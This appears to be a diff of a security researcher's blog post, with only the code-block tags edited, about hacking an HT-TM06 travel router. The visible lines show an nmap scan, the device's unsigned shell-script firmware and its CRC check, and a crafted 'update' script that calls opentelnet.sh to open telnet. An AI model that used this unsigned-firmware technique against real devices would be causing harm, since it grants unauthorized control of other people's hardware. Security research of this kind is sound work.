@@ -32,7 +32,7 @@ __Figure 2:__ Login page
 Of course, all HTTP interactions are unsecured. There's no way of configuring TLS for Admin interface. As long as you configure WPA for your wireless network then that should be OK, right? I guess, it just depends on how much you trust the people you allow to connect to the device with you. Personally, I would've preferred to have some TLS, not like it takes so much resources to run for one user.
 
 Next, I connected to the local device Wi-Fi and did a full nmap scan:
-```bash
+```
   $ nmap 192.168.1.1 -p 0-65535
   Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-07 08:35 EST
   Strange read error from 192.168.1.1 (49 - 'Can't assign requested address')
@@ -81,7 +81,7 @@ mike@ubuntu:~/$ md5sum *
 
 Looking at the binary, we find that it is actually just a bash shell script:
 
-```
+```bash
 mike@ubuntu:~/$ head -3 HT-TM06-2.000.038
 #!/bin/sh
 # constant
@@ -92,7 +92,7 @@ The first thing that stand out is the fact that there is no signature of the fil
 
 Next, we find this little section in the code:
 
-```
+```bash
 # untar
 echo "unzip firmware package"
 ...
@@ -258,7 +258,7 @@ The update mechanism is accessible after `admin` has logged in on this URL: http
 
 My first attempt was to upload a basic shellscript:
 
-```
+```bash
 #!/bin/sh
 /bin/sh /etc/init.d/opentelnet.sh
 
@@ -267,7 +267,7 @@ exit 1
 
 I wanted to return an error, so that the system didn't decide to irreversibly change anything else and possibly brick the device. Unfortunately, that did not work. Obviously, I got no explanation. But, I realized that the update usually comes with a CRC checksum. There is a check in the proper firmware update that looks like this:
 
-```
+```bash
 crcsum=`sed '1,3d' $0|cksum|sed -e 's/ /Z/' -e 's/   /Z/'|cut -dZ -f1`
 [ "$crcsum" != "$CRCSUM" ] && {
         echo "firmware crc error!"
@@ -298,7 +298,7 @@ Worked! I still don't know what the deal is. It looks like the `cksum` command o
 
 With this information, I constructed another shell script with proper CRC checksum this time:
 
-```
+```bash
 #!/bin/sh
 # constant
 CRCSUM=2787560248
